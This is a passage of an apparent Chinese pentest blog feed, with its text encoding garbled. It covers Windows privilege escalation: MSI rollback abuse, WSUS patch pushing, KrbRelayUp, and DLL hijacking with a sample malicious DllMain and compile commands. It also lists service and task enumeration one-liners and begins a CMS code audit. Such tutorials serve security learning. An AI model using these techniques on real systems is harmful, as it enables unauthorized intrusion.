æœåŠ¡ä¼šç»´æŠ¤æ¯ä¸ªæ›´æ”¹çš„è®°å½•ï¼Œä»¥é˜²éœ€è¦å›æ»šï¼Œä¸ºæ­¤å®ƒå°†åˆ›å»ºï¼š C:\Config.Msi ä¸­çš„æ–‡ä»¶å¤¹åŒ…å« å›æ»šè„šæœ¬ (.rbs) å›æ»šæ–‡ä»¶ (.rbf) è¦å°†ç‰¹æƒæ–‡ä»¶åˆ é™¤è½¬æ¢ä¸ºæœ¬åœ°æƒé™æå‡ï¼Œæ‚¨éœ€è¦æ»¥ç”¨ Windows Installer æœåŠ¡ã€‚ Windows Installer åˆ›å»ºå—ä¿æŠ¤çš„ C:\Config.Msi æ–‡ä»¶å¤¹åç«‹å³å°†å…¶åˆ é™¤ é‡æ–°åˆ›å»ºå…·æœ‰å¼± DACL æƒé™çš„ C:\Config.Msi æ–‡ä»¶å¤¹ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·å¯ä»¥åœ¨ C:\ æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ã€‚ å°†æ¶æ„ .rbs å’Œ .rbf æ–‡ä»¶æ”¾å…¥å…¶ä¸­ï¼Œä»¥ä¾¿ç”± MSI å›æ»šæ‰§è¡Œ ç„¶ååœ¨å›æ»šæ—¶ï¼ŒWindows Installer å°†å¯¹ç³»ç»Ÿè¿›è¡Œä»»æ„æ›´æ”¹ è§¦å‘æ­¤é“¾çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ zdi/FilesystemEoPs/FolderOrFileDeleteToSystemã€‚ è¯¥æ¼æ´åˆ©ç”¨åŒ…å«ä¸€ä¸ªå…·æœ‰ 2 ä¸ªæ“ä½œçš„ .msi æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ“ä½œä¼šäº§ç”Ÿå»¶è¿Ÿï¼Œç¬¬äºŒä¸ªæ“ä½œä¼šå¼•å‘é”™è¯¯ä»¥ä½¿å…¶å›æ»šã€‚ æ­¤å›æ»šå°†â€œæ¢å¤â€C:\Program Files\Common Files\microsoft shared\ink\HID.dll ä¸­çš„æ¶æ„ HID.dllã€‚ ç„¶åä½¿ç”¨ [CTRL]+[ALT]+[DELETE] åˆ‡æ¢åˆ°å®‰å…¨æ¡Œé¢å¹¶æ‰“å¼€å±å¹•é”®ç›˜ (osk.exe)ã€‚ osk.exeè¿›ç¨‹é¦–å…ˆæŸ¥æ‰¾C:\Program Files\Common Files\microsoftå…±äº«\ink\HID.dllåº“è€Œä¸æ˜¯C:\Windows\System32\HID.dll Windows åŸŸå†…ææƒ WSUS WSUS æ˜¯å¾®è½¯æ¨å‡ºçš„å…è´¹çš„ Windows æ›´æ–°ç®¡ç†æœåŠ¡ï¼Œå½“æˆ‘ä»¬è·å¾—äº†WSUSæœåŠ¡å™¨çš„æ§åˆ¶æƒé™åï¼Œå¯ä»¥é€šè¿‡æ¨é€è¡¥ä¸çš„æ–¹å¼è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚è¿™ä¸ªåˆ©ç”¨æ–¹æ³•æœ€æ—©å…¬å¼€åœ¨BlackHat USA 2015ã€‚ åˆ©ç”¨å·¥å…· https://github.com/nettitude/SharpWSUS https://github.com/AlsidOfficial/WSUSpendu https://github.com/ThunderGunExpress/Thunder_Woosus ä»¥ä¸Šä¸‰ä¸ªå·¥å…·çš„å®ç°åŸç†åŸºæœ¬ç›¸åŒï¼Œéƒ½æ˜¯åˆ›å»ºä¸€ä¸ªè°ƒç”¨psexecæ‰§è¡Œå‘½ä»¤çš„è¡¥ä¸ï¼Œå°†è¡¥ä¸æ¨é€è‡³æŒ‡å®šè®¡ç®—æœºï¼Œç­‰å¾…ç›®æ ‡è®¡ç®—æœºæ›´æ–°è¡¥ä¸ å˜¶è´§ KrbRelayUp CVE-2022â€“26923 åŸŸå†…ææƒæ¼æ´ã€‚ è¿™æœ¬è´¨ä¸Šæ˜¯åœ¨ä¸å¼ºåˆ¶æ‰§è¡Œ LDAP ç­¾åï¼ˆé»˜è®¤è®¾ç½®ï¼‰çš„ Windows åŸŸç¯å¢ƒä¸­çš„é€šç”¨æ— ä¿®å¤æœ¬åœ°æƒé™å‡çº§ã€‚ è¿™æ„å‘³ç€æ¯å°åŸŸå†… Windows ä¸»æœºéƒ½åªè¦æœªæ›´æ”¹é»˜è®¤è®¾ç½®å¹¶å¼ºåˆ¶æ‰§è¡Œ LDAP ç­¾åè®¾ç½®ï¼Œå°±å®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€é…·çš„æ˜¯ï¼Œä¸éœ€è¦æ‹¥æœ‰ç‰¹æ®Šæƒé™æˆ–æˆä¸ºç®¡ç†å‘˜ã€‚ [No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials Icyguiderâ€™s Blog](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html) [From unprivileged user to system - KrbRelayUp wwwGeneral](https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/) å‚è€ƒèµ„æ–™ PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master Â· swisskyrepo/PayloadsAllTheThings æ‰‹æŠŠæ‰‹æ•™ä½ Windowsææƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· windows-security/Readme_full.md at master Â· alphaSeclab/windows-security]]></summary></entry><entry><title type="html">Windows ææƒï¼ˆä¸‰ï¼‰åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html" rel="alternate" type="text/html" title="Windows ææƒï¼ˆä¸‰ï¼‰åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html"><![CDATA[<h1 id="windows-æœ¬åœ°ææƒ">Windows æœ¬åœ°ææƒ</h1>
<h2 id="åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ">åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ</h2>
<p>ä»¥ç®¡ç†å‘˜/ç³»ç»Ÿèº«ä»½è¿è¡Œä¸”æ–‡ä»¶æƒé™ä¸æ­£ç¡®çš„æœåŠ¡å¯èƒ½å¯¼è‡´ææƒï¼Œæ›¿æ¢è¯¥æ–‡ä»¶æˆ–è€…åŠ«æŒ DLLï¼ˆéœ€è¦å¯å†™æƒé™ï¼‰ï¼Œç„¶åé‡å¯è¯¥æœåŠ¡å³å¯ã€‚</p>
<h3 id="dll-åŠ«æŒ">DLL åŠ«æŒ</h3>
<ol>
  <li>å¯»æ‰¾ DLL åŠ«æŒåˆ©ç”¨ç‚¹
    <ol>
      <li>PowerSploit ä¸­çš„ PowerUp è„šæœ¬ï¼šFind-PathDLLHijack PowerUp.ps1</li>
      <li>Process Monitor : check for â€œName Not Foundâ€</li>
    </ol>
  </li>
  <li>ç¼–è¯‘æ¶æ„ DLL
    <ol>
      <li>For x64 compile with: â€œx86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€</li>
      <li>For x86 compile with: â€œi686-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€</li>
    </ol>

    <p>windows_dll.c å†…å®¹</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
         <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>å¯»æ‰¾æƒé™é…ç½®ä¸å½“çš„ PATH ç›®å½•
    <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt

 $ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

 $ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
 <span class="nb">type</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div>    </div>
  </li>
</ol>

<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºå¯èƒ½è‡ªä¸»åœ°åŠ è½½æŸäº›è·¯å¾„çš„ dllï¼Œæ­¤æ—¶å°±éœ€è¦é€†å‘ç‰¹å®šçš„åº”ç”¨æ‰å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ DLL åŠ«æŒã€‚</p>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://www.cnblogs.com/bonelee/p/16227518.html">Powershell ææƒæ¡†æ¶-Powerupâ€”â€”å¹³å¿ƒè€Œè®ºï¼Œè¿™ä¸ªææƒå·¥å…·è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œçœ‹åé¢å®æˆ˜ä¾‹å­ - bonelee - åšå®¢å›­</a></li>
</ul>

<h3 id="path-è·¯å¾„å¯å†™">PATH è·¯å¾„å¯å†™</h3>
<p>ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¯¹æœåŠ¡çš„ path è·¯è¿›å…·å¤‡çš„æƒé™è¿›è¡Œæ’æŸ¥ã€‚</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt
$ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

$ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
<span class="nb">type</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div></div>
<p>ä¸¤ç»„å‘½ä»¤éƒ½å¯ä»¥ç”¨ï¼Œä½†ä¼šç”Ÿæˆæ–‡ä»¶ã€‚</p>

<p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ msf ä¸­çš„ expï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/local/service_permissions
</code></pre></div></div>
<h3 id="windows-10---cve-2019-1322-usosvc">windows 10 - CVE-2019-1322 UsoSvc</h3>

<h3 id="windows-xp-sp1---upnphost">Windows XP SP1 - upnphost</h3>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows æœ¬åœ°ææƒ åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ ä»¥ç®¡ç†å‘˜/ç³»ç»Ÿèº«ä»½è¿è¡Œä¸”æ–‡ä»¶æƒé™ä¸æ­£ç¡®çš„æœåŠ¡å¯èƒ½å¯¼è‡´ææƒï¼Œæ›¿æ¢è¯¥æ–‡ä»¶æˆ–è€…åŠ«æŒ DLLï¼ˆéœ€è¦å¯å†™æƒé™ï¼‰ï¼Œç„¶åé‡å¯è¯¥æœåŠ¡å³å¯ã€‚ DLL åŠ«æŒ å¯»æ‰¾ DLL åŠ«æŒåˆ©ç”¨ç‚¹ PowerSploit ä¸­çš„ PowerUp è„šæœ¬ï¼šFind-PathDLLHijack PowerUp.ps1 Process Monitor : check for â€œName Not Foundâ€ ç¼–è¯‘æ¶æ„ DLL For x64 compile with: â€œx86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€ For x86 compile with: â€œi686-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€ windows_dll.c å†…å®¹ #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system("cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt"); ExitProcess(0); } return TRUE; } å¯»æ‰¾æƒé™é…ç½®ä¸å½“çš„ PATH ç›®å½• $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºå¯èƒ½è‡ªä¸»åœ°åŠ è½½æŸäº›è·¯å¾„çš„ dllï¼Œæ­¤æ—¶å°±éœ€è¦é€†å‘ç‰¹å®šçš„åº”ç”¨æ‰å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ DLL åŠ«æŒã€‚ å‚è€ƒï¼š Powershell ææƒæ¡†æ¶-Powerupâ€”â€”å¹³å¿ƒè€Œè®ºï¼Œè¿™ä¸ªææƒå·¥å…·è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œçœ‹åé¢å®æˆ˜ä¾‹å­ - bonelee - åšå®¢å›­ PATH è·¯å¾„å¯å†™ ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¯¹æœåŠ¡çš„ path è·¯è¿›å…·å¤‡çš„æƒé™è¿›è¡Œæ’æŸ¥ã€‚ $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt ä¸¤ç»„å‘½ä»¤éƒ½å¯ä»¥ç”¨ï¼Œä½†ä¼šç”Ÿæˆæ–‡ä»¶ã€‚ æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ msf ä¸­çš„ expï¼š exploit/windows/local/service_permissions windows 10 - CVE-2019-1322 UsoSvc Windows XP SP1 - upnphost]]></summary></entry><entry><title type="html">Windows ææƒï¼ˆäºŒï¼‰è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F.html" rel="alternate" type="text/html" title="Windows ææƒï¼ˆäºŒï¼‰è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F.html"><![CDATA[<h1 id="windows-æœ¬åœ°ææƒ">Windows æœ¬åœ°ææƒ</h1>
<h2 id="è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼">è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼</h2>
<h3 id="å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ">å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject <span class="nt">-Query</span> <span class="s2">"Select * from Win32_Process"</span> | where <span class="o">{</span><span class="nv">$_</span>.Name <span class="nt">-notlike</span> <span class="s2">"svchost*"</span><span class="o">}</span> | Select Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | ft <span class="nt">-AutoSize</span>
</code></pre></div></div>

<h3 id="å“ªäº›è¿›ç¨‹ä»¥-system-æƒé™è¿è¡Œ">å“ªäº›è¿›ç¨‹ä»¥ system æƒé™è¿è¡Œ</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v /fi <span class="s2">"username eq system"</span>
</code></pre></div></div>
<p>å¦‚æœè¿™äº›è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼Œæˆ–åŠ è½½çš„ dll æ‰€åœ¨ç›®å½•å¯å†™çš„è¯ï¼Œå¯åˆ©ç”¨ dll åŠ«æŒææƒã€‚</p>

<h3 id="powershell-ç‰ˆæœ¬">Powershell ç‰ˆæœ¬</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\1\P</span><span class="s2">owerShellEngine"</span> /v PowerShellVersion
</code></pre></div></div>
<h3 id="æšä¸¾å·²å®‰è£…ç¨‹åº">æšä¸¾å·²å®‰è£…ç¨‹åº</h3>
<p>å·²å®‰è£…ç¨‹åºå¯ä½œä¸ºææƒçªç ´ç‚¹ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | ft Parent,Name,LastWriteTime
Get-ChildItem <span class="nt">-path</span> Registry::HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE | ft Name
</code></pre></div></div>

<h3 id="æšä¸¾å·²å®‰è£…æœåŠ¡">æšä¸¾å·²å®‰è£…æœåŠ¡</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span>
<span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>
<span class="nb">tasklist</span> <span class="na">/SVC
</span></code></pre></div></div>
<h3 id="æšä¸¾è®¡åˆ’ä»»åŠ¡">æšä¸¾è®¡åˆ’ä»»åŠ¡</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="m">2</span><span class="o">&gt;</span><span class="kr">nul</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="kd">TaskName</span>
<span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v </span><span class="o">&gt;</span> <span class="nb">schtasks</span>.txt<span class="o">;</span> <span class="kd">cat</span> <span class="kd">schtask</span>.txt <span class="o">|</span> <span class="kd">grep</span> <span class="s2">"SYSTEM\|Task To Run"</span> <span class="o">|</span> <span class="kd">grep</span> <span class="na">-B </span><span class="m">1</span> <span class="kd">SYSTEM</span>
<span class="kd">Get</span><span class="na">-ScheduledTask </span><span class="o">|</span> <span class="nb">where</span> <span class="o">{</span>$_.TaskPath <span class="na">-notlike </span><span class="s2">"\Microsoft*"</span><span class="o">}</span> <span class="o">|</span> <span class="kd">ft</span> <span class="kd">TaskName</span><span class="o">,</span><span class="kd">TaskPath</span><span class="o">,</span><span class="kd">State</span>
</code></pre></div></div>
<h3 id="æšä¸¾è‡ªå¯åŠ¨åº”ç”¨">æšä¸¾è‡ªå¯åŠ¨åº”ç”¨</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">startup</span> <span class="kd">get</span> <span class="kd">caption</span><span class="o">,</span><span class="kd">command</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\Software\Microsoft\Windows\CurrentVersion\R
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\Run
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span>
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\</span><span class="nv">%username%</span><span class="s2">\Start Menu\Programs\Startup"</span>
</code></pre></div></div>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows æœ¬åœ°ææƒ è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼ å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize å“ªäº›è¿›ç¨‹ä»¥ system æƒé™è¿è¡Œ tasklist /v /fi "username eq system" å¦‚æœè¿™äº›è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼Œæˆ–åŠ è½½çš„ dll æ‰€åœ¨ç›®å½•å¯å†™çš„è¯ï¼Œå¯åˆ©ç”¨ dll åŠ«æŒææƒã€‚ Powershell ç‰ˆæœ¬ REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion æšä¸¾å·²å®‰è£…ç¨‹åº å·²å®‰è£…ç¨‹åºå¯ä½œä¸ºææƒçªç ´ç‚¹ã€‚ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name æšä¸¾å·²å®‰è£…æœåŠ¡ net start wmic service list brief tasklist /SVC æšä¸¾è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST 2&gt;nul | findstr TaskName schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State æšä¸¾è‡ªå¯åŠ¨åº”ç”¨ wmic startup get caption,command reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"]]></summary></entry><entry><title type="html">DirCMS å®¡è®¡</title><link href="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html" rel="alternate" type="text/html" title="DirCMS å®¡è®¡" /><published>2023-08-09T13:34:21+08:00</published><updated>2023-08-09T13:34:21+08:00</updated><id>/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1</id><content type="html" xml:base="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"><![CDATA[<h1 id="dircms-å®¡è®¡">DirCMS å®¡è®¡</h1>

<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<ul>
  <li>å®˜ç½‘é“¾æ¥ï¼šhttp://www.dircms.cc/</li>
  <li>ä¸‹è½½åœ°å€ï¼š<a href="https://gitee.com/greenlaw/dircms6/">dircms6</a></li>
</ul>

<h2 id="ç›®å½•ç»“æ„">ç›®å½•ç»“æ„</h2>
<h3 id="ä»£ç ç›®å½•ç»“æ„">ä»£ç ç›®å½•ç»“æ„</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span>
â”œâ”€â”€ admin.php
â”œâ”€â”€ api
â”œâ”€â”€ cache
â”œâ”€â”€ config
â”œâ”€â”€ dircms
â”œâ”€â”€ favicon.ico
â”œâ”€â”€ index.php
â”œâ”€â”€ install.php
â”œâ”€â”€ LICENSE
â”œâ”€â”€ mobile
â”œâ”€â”€ nginx.htaccess
